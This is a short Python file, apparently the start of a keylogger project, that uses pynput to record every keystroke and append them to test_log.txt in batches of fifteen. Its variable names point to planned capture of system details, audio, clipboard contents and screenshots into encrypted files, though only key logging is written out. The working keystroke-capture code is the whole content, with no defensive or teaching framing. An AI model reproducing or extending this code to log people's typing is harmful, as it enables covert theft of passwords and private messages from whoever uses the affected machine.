#Imports
from pynput.keyboard import Key, Listener

system_info = "system.txt"
audio_info = "audio.wav"
clipboard_info = "clipboard.txt"
keys_info = "key_log.txt"
screenshot_info = "screenshot.png"

system_info_e = 'e_system.txt'
clipboard_info_e = 'e_clipboard.txt'
keys_info_e = 'e_keys_logged.txt'

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count = count+1
    print("{0} pressed".format(key))
    if count >= 15:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key==Key.esc:
        return False

def write_file(keys):
    with open("test_log.txt", "a") as f:
        for key in keys:
            formatted_key = str(key).replace("'", "")
            if formatted_key.find("space") > 0:
                f.write("\n")
            elif formatted_key.find("Key") == -1:
                f.write(formatted_key)

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()